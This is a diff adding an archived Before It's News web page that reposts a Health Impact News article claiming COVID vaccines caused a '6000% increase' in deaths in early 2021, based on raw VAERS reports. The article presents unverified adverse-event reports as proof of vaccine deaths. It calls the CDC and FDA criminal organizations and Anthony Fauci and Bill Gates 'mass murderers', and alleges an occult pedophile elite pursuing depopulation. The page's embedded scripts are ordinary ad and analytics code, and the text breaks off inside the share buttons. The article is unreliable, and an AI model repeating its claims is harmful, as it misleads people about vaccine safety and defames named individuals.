@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+
+<!--[if IE 6]><html lang="en" id="ie6"><![endif]-->
+<!--[if IE 7]><html lang="en" id="ie7"><![endif]-->
+<!--[if IE 8]><html lang="en" id="ie8"><![endif]-->
+<!--[if IE 9]><html lang="en" id="ie9"><![endif]-->
+<!--[if !(IE 6) | !(IE 7) | !(IE 8) | !(IE 9) ]><!-->
+<html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#">
+<!--<![endif]-->
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="eb0d8e1aa4eb537544309f38a61737e55fe86393" name="avgthreatlabs-verification"/>
+<meta content="true" name="HandheldFriendly"/>
+<meta content="3a9e97d2-169f-453b-8cfb-ee1d885aa9d9" name="fo-verify"/>
+<script src="/cdn-cgi/apps/head/qG8xE-Uz7lAm-63-NWifn0DDLXk.js"></script><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+<link href="https://beforeitsnews.com/eu/2021/04/6000-increase-in-reported-vaccine-deaths-1st-quarter-2021-compared-to-1st-quarter-2020-2670189.html" rel="canonical">
+<link href="/manifest.json" rel="manifest" target="_blank"/>
+<link href="https://platform-api.sharethis.com" rel="dns-prefetch"/>
+<link href="https://www.google-analytics.com" rel="dns-prefetch"/>
+<link crossorigin="anonymous" href="https://fonts.gstatic.com" rel="dns-prefetch"/>
+<link href="https://www.youtube.com" rel="dns-prefetch"/>
+<meta content="2021-04-01 06:09:06" name="date">
+<meta content=" by Brian Shilhavy Editor, Health Impact News As can be expected when new experimental “vaccines” that are not approved by the FDA are given emergency use authorization to fight a “pandemic” that is now over a year old, reported deaths following the injections of these shots have now skyrocketed in the..." name="description"/>
+<meta content="EU,quarter,deaths,reported,Health,News,2020,Before Its News,beforeitsnews,eu,The Tap Blog" name="keywords"/>
+<meta content="6000% Increase in Reported Vaccine Deaths 1st Quarter 2021 Compared to 1st Quarter 2020 | EU | Before It's News" property="og:title"/>
+<meta content="article" property="og:type"/>
+<meta content="https://beforeitsnews.com/eu/2021/04/6000-increase-in-reported-vaccine-deaths-1st-quarter-2021-compared-to-1st-quarter-2020-2670189.html" property="og:url"/>
+<meta content="Before It's News | People Powered News" property="og:site_name"/>
+<meta content=" by Brian Shilhavy Editor, Health Impact News As can be expected when new experimental “vaccines” that are not approved by the FDA are given emergency use authorization to fight a “pandemic” that is now over a year old, reported deaths following the injections of these shots have now skyrocketed in the..." property="og:description"/>
+<meta content="227056257322081" property="fb:app_id"/>
+<meta content="EU,quarter,deaths,reported,Health,News,2020,Before Its News,beforeitsnews,eu,The Tap Blog" property="article:tag"/>
+<meta content="eu" property="article:section"/>
+<meta content="2021-04-01 06:09:06" property="article:published_time"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="@beforeitsnews" name="twitter:site"/>
+<meta content=" by Brian Shilhavy Editor, Health Impact News As can be expected when new experimental “vaccines” that are not approved by the FDA are given emergency use authorization to fight a “pandemic” that is now over a year old, reported deaths following the injections of these shots have now skyrocketed in the..." name="twitter:description"/>
+<meta content="6000% Increase in Reported Vaccine Deaths 1st Quarter 2021 Compared to 1st Quarter 2020 | EU | Before It's News" name="twitter:title"/>
+<meta content="beforeitsnews.com" name="twitter:domain"/>
+<meta content="@beforeitsnews" name="twitter:creator"/>
+<meta content="https://tapnewswire.com/wp-content/uploads/2021/04/first-quarter-vaccine-deaths-2021-300x210.jpg" property="og:image"/>
+<meta content="https://tapnewswire.com/wp-content/uploads/2021/04/first-quarter-vaccine-deaths-2021-300x210.jpg" property="twitter:image"/>
+<link href="//fonts.googleapis.com/css?family=Oswald:700|Scada:700" rel="stylesheet" type="text/css"/>
+<link href="/static/css-v3/global-bin-rev-202302041.css" rel="stylesheet" type="text/css"/>
+<link href="/static/css-v3/fancybox-bin-rev-202302041.css" rel="stylesheet" type="text/css"/>
+<link href="/static/css-v3/story-bin-rev-202302041.css" rel="stylesheet" type="text/css"/>
+<link href="/static/css-dashboard/jquery-ui.css" rel="stylesheet" type="text/css"/>
+<link href="/static/css-v3/responsive-bin-rev-202302041.css" rel="stylesheet" type="text/css"/>
+<link href="/static/css-v3/web-responsive-bin-rev-202302041.css" rel="stylesheet" type="text/css"/>
+<script src="/static/js-v3/jquery-fancybox-mobiledetect-uuid.js" type="text/javascript"></script>
+<script src="/static/js-v3/global-bin-rev-202302041.js" type="text/javascript"></script>
+<title>6000% Increase in Reported Vaccine Deaths 1st Quarter 2021 Compared to 1st Quarter 2020 | EU | Before It's News</title>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+        })(window,document,'script','dataLayer','GTM-5D8XJ6Q');</script>
+<script async="async" src="https://platform-api.sharethis.com/js/sharethis.js#property=5f2c559be7229f0012f31c92&amp;product=sticky-share-buttons" type="text/javascript"></script>
+</meta></link></head>
+<body id="v3">
+<span id="admin_tab"></span>
+<div id="body-container">
+<div id="top-alert" style="display: none;">
+<div class="ad-message__icon">
+<svg version="1.1" viewbox="0 0 20 24" xmlns="http://www.w3.org/2000/svg">
+<g fill="none" fill-rule="evenodd" transform="translate(-18 -479)">
+<g fill="#fff" transform="translate(0 464)">
+<g transform="translate(16 15)">
+<path d="m12 9.6667l-4.3333-4.3333-1.3333 1.3333 4.3333 4.3333-4.3333 4.3333 1.3333 1.3333 4.3333-4.3333 4.3333 4.3333 1.3333-1.3333-4.3333-4.3333 4.3333-4.3333-1.3333-1.3333-4.3333 4.3333zm10-8.3552v10.189c0 5-3.3333 9.1667-10 12.5-6.6667-3.3333-10-7.5-10-12.5v-10.189c3.1889-0.85536 6.5412-1.3115 10-1.3115s6.8111 0.45611 10 1.3115z"></path>
+</g>
+</g>
+</g>
+</svg>
+</div>
+<div class="ad-message__message">
+<div class="message__top">You're using an Ad-Blocker.</div>
+<div class="message__content">BeforeItsNews only exists through ads.<br/>We ask all patriots who appreciate the evil we expose and want to
+help us savage the NWO with more Truth to disable your ad-blocker on our site only so we can grow and expose more evil!<br/>Funding
+gives us more weapons! Thank you patriots! Oh and If you disable the Ad-blocker - on your deathbed you will receive total
+consciousness. So you got that going for you...which is nice!
+</div>
+</div>
+<div class="ad-message__buttons clearfix">
+<div class="ad-message__button" id="ad-disable" onclick="adDisable();">Disable</div>
+<div class="ad-message__button" id="ad-dismiss" onclick="adDismiss();">Dismiss</div>
+</div>
+</div>
+<div class="fixed-enabled" id="header">
+<div class="header-top">
+<div id="icon"><a href="/"><img height="110px" src="//img.beforeitsnews.com/img/v3/top-logo.png"/> </a></div>
+<div id="logo"><a href="/">Before It's News</a></div>
+<div id="searchbar">
+<form action="/v3/search/" id="cse-search-box">
+<input autocomplete="off" id="q" name="q" placeholder="Search..." size="30" type="text"/>
+<input id="sa" name="sa" onclick="if ($('#q').val() == '') {$('#q').focus(); alert('Please, input query text!'); return false;}" type="submit" value=""/>
+</form>
+<div id="google_translate_element" title="Translate"></div>
+</div>
+<div id="user_status"></div>
+<div id="menu">
+<div id="menu_center">
+<ul id="header-main-menu">
+<li><a href="/v3/list/featured.html">Featured</a> <span>|</span></li>
+<li><a href="/v3/list/v2_top_money.html">Economy</a> <span>|</span></li>
+<li><a href="/v3/list/v2_top_health.html">Health</a> <span>|</span></li>
+<li><a href="/v3/list/v2_top_beyond_science.html">Beyond Science</a> <span>|</span></li>
+<li><a href="/v3/list/v2_top_power_of_belief.html">Power of Belief</a> <span>|</span></li>
+<li><a href="/v3/list/v2_top_sustainable_living.html">Sustainable Living</a><span>|</span></li>
+<li><a href="/v3/list/v2_top_inspiration.html">Inspiration</a> <span>|</span></li>
+<li><a href="/v3/live/">Live</a> <span>|</span></li>
+<li><a href="/v3/video/">Video</a> <span>|</span></li>
+<li><a href="/v3/top50/">Top 50</a> <span>|</span></li>
+<li><a href="/v3/recent/" target="_blank">Most Recent</a> <span>|</span></li>
+<li><a href="https://www.herbanomics.com/collections/all" target="_blank">Shopping</a> <span>|</span></li>
+<li><a href="/v3/categories/">Categories</a></li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<main>
+<div id="main">
+<div id="container">
+<div style="font-family: Scada, Oswald, sans-serif; font-size: 19px; padding-bottom: 15px">
+Read the <a href="/v3/about/" target="_blank">Beforeitsnews.com</a> story here.
+<span style="float: right;">Advertise at <a href="/v3/advertise/" target="_blank">Before It's News</a> here.</span>
+</div>
+<div id="infobar">
+<div id="profile_pic">
+<img alt="Profile image" id="profile_image" src="//img.beforeitsnews.com/img/profiles/1345969cf0494e85fbf7c0c293c6cdce20d4a636.jpeg"/>
+</div>
+<div id="profile_info">
+<div id="like_contributor"><span id="like_contributor_count"></span></div>
+<div id="like_story"><span id="like_story_count"></span></div>
+<div id="attribution">By <span class="authors_name" id="pen_name">The Tap Blog</span>
+<span id="roles"></span><br>
+<a href="/v3/contributor/bio/?uid=79165" id="profile_href" target="_blank">Contributor profile</a> |
+<a href="/v3/contributor/stories/?uid=79165" id="stories_href" target="_blank">More stories</a><br/>
+<div id="subscribenewsletter"></div>
+</br></div>
+</div>
+<div id="viewcounters">
+<table border="0" cellpadding="0" cellspacing="0" style="width:175px; margin: 0px; padding: 0px; line-height: 12px;">
+<tr>
+<td align="center" colspan="2" height="8">
+<div class="story_views">Story Views</div>
+</td>
+</tr>
+<tr>
+<td align="left" width="90">Now:</td>
+<td align="left"><span id="chartbeat_count"></span></td>
+</tr>
+<tr>
+<td align="left">Last hour:</td>
+<td align="left"><span id="counter_hour"></span></td>
+</tr>
+<tr>
+<td align="left">Last 24 hours:</td>
+<td align="left"><span id="counter_day"></span></td>
+</tr>
+<tr>
+<td align="left">Total:</td>
+<td align="left"><span id="counter_total"></span></td>
+</tr>
+</table>
+</div>
+<div id="badges">
+<div id="featured_contributor_story"></div> </div>
+</div>
+<article>
+<div id="story">
+<div class="story_wrapper" id="story_wrapper">
+<div id="story_column">
+<header>
+<div id="headline"><h1>6000% Increase in Reported Vaccine Deaths 1st Quarter 2021 Compared to 1st Quarter 2020</h1></div>
+<div id="story_info">
+<div class="post_date">
+Thursday, April 1, 2021 6:09 </div>
+<div id="edit_delete"></div>
+</div>
+</header>
+<div id="disclaimer"></div>
+<div id="story_toolbar">
+<div id="fact_meter"><span id="fact_percent"></span>
+% of readers think this story is Fact. Add your two cents.<br>
+<div class="fiction_unselected" id="fiction"></div>
+<div id="scale"></div>
+<div class="fact_unselected" id="fact"></div>
+</br></div>
+</div>
+<input id="author_id" name="author_id" type="hidden" value="79165"/>
+<input id="story_id" name="story_id" type="hidden" value="2670189"/>
+<input id="category_id" name="category_id" type="hidden" value="199"/>
+<input id="story_tsp" name="story_tsp" type="hidden" value="1617271746"/>
+<div id="contributor_stories"></div>
+<div class="top_clarifying_the_truth_social_share" style="display: none;">
+<div id="top_clarifying_facebook_share_button" title="Share on Facebook"></div>
+<div id="top_clarifying_tweet_share_button" title="Share on Twitter"></div>
+<div id="top_clarifying_google_share_button" title="Share on Google Plus"></div>
+<div id="top_clarifying_sumbleupon_share_button" title="Share on Stumbleupon"></div>
+<div id="top_clarifying_email_share_button" style="cursor:pointer;" title="Share via Email">
+<img src="//img.beforeitsnews.com/img/social/mail_inline_share.png"/>
+</div>
+</div>
+<div class="sharethis-inline-share-buttons"></div>
+<div style="clear: both"></div>
+<div id="body">
+<p><img loading="lazy" src="/images/archives/340aa827a517fefd39b29100f11dc989d053c4fb.jpg" style="display:block; margin:0 auto; width:400px;"/><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<br>
+<html><body>
+</body></html></br></p>
+<p>by <strong>Brian Shilhavy</strong><br/><strong>Editor, Health Impact News</strong></p>
+<p>As can be expected when new experimental “vaccines” that are not approved by the FDA are given emergency use authorization to fight a “pandemic” that is now over a year old, reported deaths following the injections of these shots have now skyrocketed in the U.S. population by over 6000% here at the end of the first quarter of 2021, as compared to recorded deaths following FDA-approved vaccines at the end of the first quarter of 2020.</p>
+<p>These new products, which many doctors and scientists claim <a href="/v3/r2/?url=aHR0cHM6Ly9oZWFsdGhpbXBhY3RuZXdzLmNvbS8yMDIxL2RyLWRhdmlkLW1hcnRpbi1vbi1leHBlcmltZW50YWwtbXJuYS1jb3ZpZC12YWNjaW5lcy10aGlzLWlzLW5vdC1hLXZhY2NpbmUtaXQtaXMtYS1tZWRpY2FsLWRldmljZS8=" rel="nofollow" target="_blank">do not even meet the legal definition of a “vaccine</a>,” are described by the manufacturers themselves as “<a href="/v3/r2/?url=aHR0cHM6Ly9oZWFsdGhpbXBhY3RuZXdzLmNvbS8yMDIxL3RoZS1uZXctbXJuYS1jb3ZpZC12YWNjaW5lcy1pbmplY3QtYW4tb3BlcmF0aW5nLXN5c3RlbS1pbnRvLXlvdXItYm9keS1ub3QtYS1jb25zcGlyYWN5LXRoZW9yeS1tb2Rlcm5hLWFkbWl0cy1pdC8=" rel="nofollow" target="_blank">operating systems</a>” called the “<a href="/v3/r2/?url=aHR0cHM6Ly9oZWFsdGhpbXBhY3RuZXdzLmNvbS8yMDIxL21vZGVybmFzLXRvcC1zY2llbnRpc3Qtb24tbXJuYS10ZWNobm9sb2d5LWluLWNvdmlkLXNob3RzLXdlLWFyZS1hY3R1YWxseS1oYWNraW5nLXRoZS1zb2Z0d2FyZS1vZi1saWZlLw==" rel="nofollow" target="_blank">software of life</a>,” and prior to COVID they have never been approved to be used on human populations.</p>
+<p>There are literally thousands of doctors and scientists around the world who have spoken out against these experimental injections, some even calling them “<a href="/v3/r2/?url=aHR0cHM6Ly9oZWFsdGhpbXBhY3RuZXdzLmNvbS8yMDIwL2NvdmlkLXZhY2NpbmVzLWJpb2xvZ2ljYWwtd2VhcG9ucy1vZi1tYXNzLWRlc3RydWN0aW9uLXNheXMtd3lvbWluZy1tZWRpY2FsLWRvY3Rvci1hbmQtbWFuYWdlci1mb3Itd3lvbWluZ3Mtc3RhdGUtcHVibGljLWhlYWx0aC1kZXBhcnRtZW50Lw==" rel="nofollow" target="_blank">biological weapons of mass destruction</a>.”</p>
+<p>Their voices are censored in the pharma-controlled corporate media and by Big Tech, so the people dying and becoming injured by these injections are the pro-vaccine people who primarily only get their information from these censored sources that are funded by Wall Street corporate billionaires, such as Bill Gates.</p> <p>
+<div class="rotating_text_link" id="rotating_text_link_20"></div>
+<div id="contentAdItem_1">
+<div id="M310742ScriptRootC720409"></div>
+<script async="" src="https://jsc.mgid.com/b/e/beforeitsnews.com.720409.js"></script>
+</div>
+</p><p><div style="clear: both"><div class="rotating_text_link" id="rotating_text_link_21"></div></div></p>
+<p>The CDC Vaccine Adverse Event Reporting System (VAERS), a <a href="/v3/r2/?url=aHR0cHM6Ly92YWVycy5oaHMuZ292Lw==" rel="nofollow" target="_blank">U.S. Government funded database</a> that tracks injuries and deaths reported to be caused by vaccines, reported only 36 deaths during the first quarter of 2020 through March 31st, and almost 50% of those deaths were infants below the age of 3.</p>
+<div id="attachment_68141">
+<p id="caption-attachment-68141"><a href="/v3/r2/?url=aHR0cHM6Ly9tZWRhbGVydHMub3JnL3ZhZXJzZGIvZmluZGZpZWxkLnBocD9UQUJMRT1PTiZhbXA7R1JPVVAxPUFHRSZhbXA7RVZFTlRTPU9OJmFtcDtESUVEPVllcyZhbXA7VkFYX1lFQVJfTE9XPTIwMjAmYW1wO1ZBWF9NT05USF9MT1c9MDEmYW1wO1ZBWF9ZRUFSX0hJR0g9MjAyMCZhbXA7VkFYX01PTlRIX0hJR0g9MDM=" rel="nofollow" target="_blank">Source</a>.</p>
+</div>
+<p>Since today, the day this report is being written and published, is the last day of March, 2021, we do not have complete stats from VAERS on injuries and deaths following vaccination yet. But here’s what we know based on what the CDC has published through yesterday, March 30, 2021.</p>
+<p>The last data dump into VAERS was published last week on March 26, 2021, and it listed 2050 deaths following the experimental COVID injections. See the <a href="/v3/r2/?url=aHR0cHM6Ly9oZWFsdGhpbXBhY3RuZXdzLmNvbS8yMDIxL2NkYy0yMDUwLWRlYWQtZm9sbG93aW5nLWNvdmlkLXZhY2NpbmVzLWFzLTMwMC1kZWF0aHMtYWRkZWQtdGhpcy13ZWVrLTE2LWRlYXRocy1mcm9tLW5ldy1qai1zaG90LXByb2R1Y2luZy1jb3ZpZC1zeW1wdG9tcy8=" rel="nofollow" target="_blank">report here</a>.</p>
+<p>However, some of those deaths following the COVID injections occurred in December, 2020, when the Pfizer and Moderna shots were issued EUA’s by the FDA.</p>
+<p>So we ran the report for this year, 2021, from which we know the data is only current through March 19, 2021, and it showed 1,754 deaths following ALL vaccines, not just the COVID injections.</p> <p>
+<div class="rotating_text_link" id="rotating_text_link_22"></div>
+<div id="contentAdItem_2">
+<div id="M310742ScriptRootC720410"></div>
+<script async="" src="https://jsc.mgid.com/b/e/beforeitsnews.com.720410.js"></script>
+</div>
+</p><p><div style="clear: both"><div class="rotating_text_link" id="rotating_text_link_23"></div></div></p>
+<div id="attachment_68142">
+<p id="caption-attachment-68142"><a href="/v3/r2/?url=aHR0cHM6Ly9tZWRhbGVydHMub3JnL3ZhZXJzZGIvZmluZGZpZWxkLnBocD9UQUJMRT1PTiZhbXA7R1JPVVAxPUFHRSZhbXA7RVZFTlRTPU9OJmFtcDtESUVEPVllcyZhbXA7VkFYX1lFQVJfTE9XPTIwMjE=" rel="nofollow" target="_blank">Source</a>.</p>
+</div>
+<p>Notice that 80% of these recorded deaths are among seniors over the age of 65!</p>
+<p>How is this NOT a national tragedy that should be headline news everywhere??</p>
+<p>As noted above, there are 2050 deaths recorded following COVID injections as of March 19th, but those include some deaths in December, 2020.</p>
+<p>Yesterday, the CDC reported that deaths following COVID injections are now 2,509. (<a href="/v3/r2/?url=aHR0cHM6Ly93d3cuY2RjLmdvdi9jb3JvbmF2aXJ1cy8yMDE5LW5jb3YvdmFjY2luZXMvc2FmZXR5L2FkdmVyc2UtZXZlbnRzLmh0bWw=" rel="nofollow" target="_blank">Source</a>.)</p>
+<p>That is an increase of 459 deaths from what the CDC reported through VAERS through March 19th. So 1754 plus these 459 deaths gives us the total deaths so far through March 2021, which is 2,213, although after the next data dump in to VAERS this coming Friday, this number will increase even more when we add the non-COVID vaccine deaths also.</p><p><div class="rotating_text_link" id="rotating_text_link_24"></div></p>
+<p>That is an increase of over 6000% from last year during the same time period.</p>
+<p>The increase in deaths reported is most certainly related to the new experimental COVID injections, and yet the CDC and FDA’s position is that NOT ONE of these deaths are related to the COVID injections.</p>
+<script async="" charset="utf-8" src="https://platform.twitter.com/widgets.js"></script><blockquote class="twitter-tweet"><p><strong>A review of available clinical information including death certificates, autopsy, and medical records revealed no evidence that vaccination contributed to patient deaths. </strong>(Emphasis theirs – <a href="/v3/r2/?url=aHR0cHM6Ly93d3cuY2RjLmdvdi9jb3JvbmF2aXJ1cy8yMDE5LW5jb3YvdmFjY2luZXMvc2FmZXR5L2FkdmVyc2UtZXZlbnRzLmh0bWw=" rel="nofollow" target="_blank">Source</a>.)</p>
+</blockquote>
+<p>As we have reported numerous times now, the <a href="/v3/r2/?url=aHR0cHM6Ly9oZWFsdGhpbXBhY3RuZXdzLmNvbS8/ZmluZD1jZGMrZmRhK2NvcnJ1cHRpb24=" rel="nofollow" target="_blank">CDC and FDA are criminal organizations</a> run by Big Pharma insiders controlled by the Wall Street Billionaires and bankers. Their main interest is in protecting Big Pharma and their products, and not the health of the public.</p>
+<p>Those in the public who continue to trust them for accurate medical advice will suffer dearly, many with their own lives, as seen happening right now in the first quarter of 2021 with a 6000% + increase in <strong>deaths by injection</strong>.</p><p><div class="rotating_text_link" id="rotating_text_link_25"></div></p>
+<p>So far, these tragic deaths are among the foolish who drank the COVID Kool Aid and did not bother to research these new medical products themselves first, blindly trusting in “health authorities” like <a href="/v3/r2/?url=aHR0cHM6Ly9oZWFsdGhpbXBhY3RuZXdzLmNvbS8/ZmluZD1BbnRob255K0ZhdWNpK21hc3MrbXVyZGVy" rel="nofollow" target="_blank">Anthony Fauci</a> and <a href="/v3/r2/?url=aHR0cHM6Ly9oZWFsdGhpbXBhY3RuZXdzLmNvbS8/ZmluZD1CaWxsK0dhdGVzK21hc3MrbXVyZGVy" rel="nofollow" target="_blank">Bill Gates</a> who are MASS MURDERERS.</p>
+<p>But once all of these pro-vaccine people eager to get the COVID “<a href="/v3/r2/?url=aHR0cHM6Ly9oZWFsdGhpbXBhY3RuZXdzLmNvbS8yMDIxL21vZGVybmFzLXRvcC1zY2llbnRpc3Qtb24tbXJuYS10ZWNobm9sb2d5LWluLWNvdmlkLXNob3RzLXdlLWFyZS1hY3R1YWxseS1oYWNraW5nLXRoZS1zb2Z0d2FyZS1vZi1saWZlLw==" rel="nofollow" target="_blank">software of life</a>” have been injected with this new <a href="/v3/r2/?url=aHR0cHM6Ly9oZWFsdGhpbXBhY3RuZXdzLmNvbS8yMDIxL3RoZS1uZXctbXJuYS1jb3ZpZC12YWNjaW5lcy1pbmplY3QtYW4tb3BlcmF0aW5nLXN5c3RlbS1pbnRvLXlvdXItYm9keS1ub3QtYS1jb25zcGlyYWN5LXRoZW9yeS1tb2Rlcm5hLWFkbWl0cy1pdC8=" rel="nofollow" target="_blank">human operating system</a> which will need constant updates (booster shots), the eugencists will turn their attention to the “vaccine hesitant,” and they have all their ducks lined up in a row now.</p>
+<p>They control the corporate mass media, including Big Tech, and they also control the American judicial system. At the very top we are dealing with psychopaths, most of them <a href="/v3/r2/?url=aHR0cHM6Ly9jcmVhdGVkNGhlYWx0aC5vcmcvdW5tYXNraW5nLXdoby1pcy1iZWhpbmQtdGhlLXBsYW5kZW1pYy1hbmQtcmlvdGluZy10by11c2hlci1pbi10aGUtbmV3LXdvcmxkLW9yZGVyLw==" rel="nofollow" target="_blank">pedophiles involved in the Occult</a>, and their goals are to control the world’s financial system, reduce the world’s population, and destroy the family and take over control of <a href="/v3/r2/?url=aHR0cHM6Ly9oZWFsdGhpbXBhY3RuZXdzLmNvbS8yMDIxL2ZhbW91cy1wb2xpc2gtZmlsbS1wcm9kdWNlci1jcmVhdGVzLWRvY3VtZW50YXJ5LWV4cG9zaW5nLXRoZS1zYWxlLW9mLWJhYmllcy1mb3Itc2V4LWFuZC1vcmdhbi1oYXJ2ZXN0aW5nLWlmLXlvdS1jYW4taGFuZGxlLWl0Lw==" rel="nofollow" target="_blank">raising children for their own evil purposes</a>.</p>
+<p>The time is short now, where not a single person on this planet will be exempt from making very difficult choices that will no longer be optional.</p>
+<p>This was written to a different group of people in a different day and age, but its principles are eternal, and as true today as any other point in history, if not more so today:</p><p><div class="rotating_text_link" id="rotating_text_link_26"></div></p>
+<script async="" charset="utf-8" src="https://platform.twitter.com/widgets.js"></script><blockquote class="twitter-tweet"><p>See, I set before you today life and prosperity, death and destruction.</p>
+<p>For I command you today to love the LORD your God, to walk in his ways, and to keep his commands, decrees and laws; then you will live and increase, and the LORD your God will bless you in the land you are entering to possess.</p>
+<p>But if your heart turns away and you are not obedient, and if you are drawn away to bow down to other gods and worship them, I declare to you this day that you will certainly be destroyed. (Deuteronomy 30:15-18)</p>
+</blockquote>
+<p> <a data-provider="facebook" href="/v3/r2/?url=aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3NoYXJlci5waHA/dT1odHRwcyUzQSUyRiUyRnRhcG5ld3N3aXJlLmNvbSUyRjIwMjElMkYwNCUyRjYwMDAtaW5jcmVhc2UtaW4tcmVwb3J0ZWQtdmFjY2luZS1kZWF0aHMtMXN0LXF1YXJ0ZXItMjAyMS1jb21wYXJlZC10by0xc3QtcXVhcnRlci0yMDIwJTJGJmFtcDt0PTYwMDAlMjUlMjBJbmNyZWFzZSUyMGluJTIwUmVwb3J0ZWQlMjBWYWNjaW5lJTIwRGVhdGhzJTIwMXN0JTIwUXVhcnRlciUyMDIwMjElMjBDb21wYXJlZCUyMHRvJTIwMXN0JTIwUXVhcnRlciUyMDIwMjAmYW1wO3M9MTAwJmFtcDtwJTVCdXJsJTVEPWh0dHBzJTNBJTJGJTJGdGFwbmV3c3dpcmUuY29tJTJGMjAyMSUyRjA0JTJGNjAwMC1pbmNyZWFzZS1pbi1yZXBvcnRlZC12YWNjaW5lLWRlYXRocy0xc3QtcXVhcnRlci0yMDIxLWNvbXBhcmVkLXRvLTFzdC1xdWFydGVyLTIwMjAlMkYmYW1wO3AlNUJpbWFnZXMlNUQlNUIwJTVEPWh0dHBzJTNBJTJGJTJGdGFwbmV3c3dpcmUuY29tJTJGd3AtY29udGVudCUyRnVwbG9hZHMlMkYyMDIxJTJGMDQlMkZmaXJzdC1xdWFydGVyLXZhY2NpbmUtZGVhdGhzLTIwMjEtMzAweDIxMC5qcGcmYW1wO3AlNUJ0aXRsZSU1RD02MDAwJTI1JTIwSW5jcmVhc2UlMjBpbiUyMFJlcG9ydGVkJTIwVmFjY2luZSUyMERlYXRocyUyMDFzdCUyMFF1YXJ0ZXIlMjAyMDIxJTIwQ29tcGFyZWQlMjB0byUyMDFzdCUyMFF1YXJ0ZXIlMjAyMDIw" rel="nofollow" style=" width:48px;height:48px;margin:0;margin-bottom:5px;margin-right:5px;" target="_blank" title="Share on Facebook"></a><a data-provider="twitter" href="https://twitter.com/intent/tweet?url=https%3A%2F%2Ftapnewswire.com%2F2021%2F04%2F6000-increase-in-reported-vaccine-deaths-1st-quarter-2021-compared-to-1st-quarter-2020%2F&amp;text=Hey%20check%20this%20out" rel="nofollow" style=" width:48px;height:48px;margin:0;margin-bottom:5px;margin-right:5px;" title="Share on Twitter"></a><a data-provider="reddit" href="/v3/r2/?url=aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9zdWJtaXQ/dXJsPWh0dHBzJTNBJTJGJTJGdGFwbmV3c3dpcmUuY29tJTJGMjAyMSUyRjA0JTJGNjAwMC1pbmNyZWFzZS1pbi1yZXBvcnRlZC12YWNjaW5lLWRlYXRocy0xc3QtcXVhcnRlci0yMDIxLWNvbXBhcmVkLXRvLTFzdC1xdWFydGVyLTIwMjAlMkYmYW1wO3RpdGxlPTYwMDAlMjUlMjBJbmNyZWFzZSUyMGluJTIwUmVwb3J0ZWQlMjBWYWNjaW5lJTIwRGVhdGhzJTIwMXN0JTIwUXVhcnRlciUyMDIwMjElMjBDb21wYXJlZCUyMHRvJTIwMXN0JTIwUXVhcnRlciUyMDIwMjA=" rel="nofollow" style=" width:48px;height:48px;margin:0;margin-bottom:5px;margin-right:5px;" target="_blank" title="Share on Reddit"></a><a data-provider="pinterest" href="/v3/r2/?url=aHR0cHM6Ly9waW50ZXJlc3QuY29tL3Bpbi9jcmVhdGUvYnV0dG9uLz91cmw9aHR0cHMlM0ElMkYlMkZ0YXBuZXdzd2lyZS5jb20lMkYyMDIxJTJGMDQlMkY2MDAwLWluY3JlYXNlLWluLXJlcG9ydGVkLXZhY2NpbmUtZGVhdGhzLTFzdC1xdWFydGVyLTIwMjEtY29tcGFyZWQtdG8tMXN0LXF1YXJ0ZXItMjAyMCUyRiZhbXA7bWVkaWE9aHR0cHMlM0ElMkYlMkZ0YXBuZXdzd2lyZS5jb20lMkZ3cC1jb250ZW50JTJGdXBsb2FkcyUyRjIwMjElMkYwNCUyRmZpcnN0LXF1YXJ0ZXItdmFjY2luZS1kZWF0aHMtMjAyMS0zMDB4MjEwLmpwZyZhbXA7ZGVzY3JpcHRpb249NjAwMCUyNSUyMEluY3JlYXNlJTIwaW4lMjBSZXBvcnRlZCUyMFZhY2NpbmUlMjBEZWF0aHMlMjAxc3QlMjBRdWFydGVyJTIwMjAyMSUyMENvbXBhcmVkJTIwdG8lMjAxc3QlMjBRdWFydGVyJTIwMjAyMA==" rel="nofollow" style=" width:48px;height:48px;margin:0;margin-bottom:5px;margin-right:5px;" target="_blank" title="Pin it with Pinterest"></a><a data-provider="linkedin" href="/v3/r2/?url=aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL3NoYXJlQXJ0aWNsZT9taW5pPXRydWUmYW1wO3VybD1odHRwcyUzQSUyRiUyRnRhcG5ld3N3aXJlLmNvbSUyRjIwMjElMkYwNCUyRjYwMDAtaW5jcmVhc2UtaW4tcmVwb3J0ZWQtdmFjY2luZS1kZWF0aHMtMXN0LXF1YXJ0ZXItMjAyMS1jb21wYXJlZC10by0xc3QtcXVhcnRlci0yMDIwJTJGJmFtcDt0aXRsZT02MDAwJTI1JTIwSW5jcmVhc2UlMjBpbiUyMFJlcG9ydGVkJTIwVmFjY2luZSUyMERlYXRocyUyMDFzdCUyMFF1YXJ0ZXIlMjAyMDIxJTIwQ29tcGFyZWQlMjB0byUyMDFzdCUyMFF1YXJ0ZXIlMjAyMDIw" rel="nofollow" style=" width:48px;height:48px;margin:0;margin-bottom:5px;margin-right:5px;" target="_blank" title="Share on Linkedin"></a><a data-provider="mail" 